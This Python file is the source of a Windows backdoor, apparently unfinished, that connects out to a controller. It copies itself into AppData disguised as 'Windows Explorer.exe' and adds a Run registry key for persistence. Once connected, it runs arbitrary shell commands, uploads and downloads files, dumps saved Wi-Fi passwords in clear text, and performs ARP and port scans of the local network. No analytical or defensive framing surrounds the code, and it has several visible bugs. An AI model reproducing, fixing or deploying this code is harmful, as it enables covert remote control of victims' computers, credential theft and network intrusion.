#!/usr/bin/env python3
"""
change server name  to main.py
serve it as file and start the handler wich has custom code exec
needs to be debuged
ssh clients needs to be planted in reg or startup
"""
from urllib.request import urlopen
import urllib
import socket
import subprocess
import json
import os
import sys
import base64
import sys
import shutil
import re
import scapy.all as scapy
from time import sleep
import requests
class MotherFucker():
    def __init__(self, ip, port):
        self.persistence()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
    def persistence(self):
        location = os.environ["appdata"] + "\\Windows Explorer.exe"
        if not os.path.exists(location):
            shutil.copyfile(sys.executable, location)
            subprocess.call('reg add HKCU\Software\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + location + '"' , shell=True)
    def check_status(self):
        pass

    def cmd_send(self, data):
        json_send = json.dumps(data)
        self.connection.send(json_send)
    def cmd_recv(self):
        json_recived = ""
        while True:
            try:
                json_recived += self.connection.recv(1024)
                return json.loads(json_recived)
            except ValueError:
                continue
    def change_dir(self, path):
        os.chdir(path)
        return "Changed dir to %s" % path
    def upload_file(self, path, content):
        with open(path, "wb") as file:
            uploaded_file = base64.b64decode(content)
            file.write(uploaded_file)
            return "Uploaded Succesfully !"
    def download_file(self, path):
        with open(path, "rb") as file:
            download_file = base64.b64encode(file.read())
            return download_file
    def exec_command(self, command):
        return subprocess.check_output(command, shell=True)
    def get_ip():
        data = str(urlopen('http://checkip.dyndns.com/').read())
        ip = socket.gethostbyname(socket.gethostname())
        private = ip
        pub = re.compile(r'Address: (\d+.\d+.\d+.\d+)').search(data).group(1)
        return f"Private ip of the machine is {private}\nPublic ip of the machine is {pub}", private, pub
    def get_wifi():
        # wifi clear pass
        data = os.popen("netsh wlan show profiles").read()
        wifi = re.compile("All User Profile\s*:.(.*)")
        ssid = wifi.findall(data)
        try:
            wlan = subprocess.Popen("netsh wlan show profile "+str(ssid.replace(" ","*"))+" key=clear").read()
            pass_regex = re.compile("Key Content\s*:.(.*)")
            return pass_regex.search(wlan).group(1)
        except:
            return " "
    def arp_scan(self):
        # scans the entire network
        ip = self.get_ip.private
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbose=False)[0]
        machines = []
        for i in answered_list:
            machine_dict = {"ip": i[1].psrc, "mac": i[1].hwsrc}
            machines.append(machine_dict)
        return machines
    def port_scan(self, ip):
        target = ip
        data = ""
        try:
            for port in range(1,65535):
                s = socket.socket((socket.AF_INET,socket.SOCK_STREAM))
                socket.setdeafulttimeout(1)
                result = s.connect_ex((target,port))
                if result == 0:
                    data += f"---\tIP {target}\n\n\t{port} is open"
                s.close()
        except KeyboardIntrrupt:
            data += "\nKeyboard Intrupted ."
            pass
        except socket.gaierror:
            data += f"\nCould not Resolve IP : {target}"
            sys.exit()
        except socket.error:
            data += f"\n Server not Working ..."
            sys.exit()
        return data
    def scan_result(self):
        result = ""
        for host in self.arp_scan:
            result += self.port_scan(host)
        encoded_result = base64.b64encode(result)
        return encoded_result


    def run(self):
        while True:
            rcvd_cmd = self.json_recv()
            try:
                if rcvd_cmd[0] == "exit":
                    self.connection.close()
                    sys.exit()
                elif rcvd_cmd[0] == "cd" and len(rcvd_cmd) > 1:
                    cmd_rslt = self.change_dir(rcvd_cmd[1])
                elif rcvd_cmd[0] == "download":
                    cmd_rslt = self.download_file(rcvd_cmd[1])
                elif rcvd_cmd[0] == "upload":
                    cmd_rslt = self.upload_file(rcvd_cmd[1], rcvd_cmd[2])
                elif rcvd_cmd[0] == "getip":
                    cmd_rslt = self.get_ip
                elif rcvd_cmd[0] == "scan":
                    cmd_rslt = self.scan_result
                elif rcvd_cmd[0] == "get_wifi":
                    cmd_rslt = self.get_wifi
                else:
                    cmd_rslt = self.exec_command(rcvd_cmd)
            except Exception as e :
                    cmd_rslt = "[-] Error During Command Execution.\n ERROR:\t{e}\t"

            self.cmd_send(cmd_rslt)

def get_status():
    s = requests.get('https://poggerpussy.github.io').text
    status = re.sub(r"<.*?>",'', s)
    return status



if __name__ == "__main__":
    while True:
        try:
            if get_status:
                app = MotherFucker("0.0.0.0", 80)
                app.run()
        except Exception as e:
            print(e)
            pass
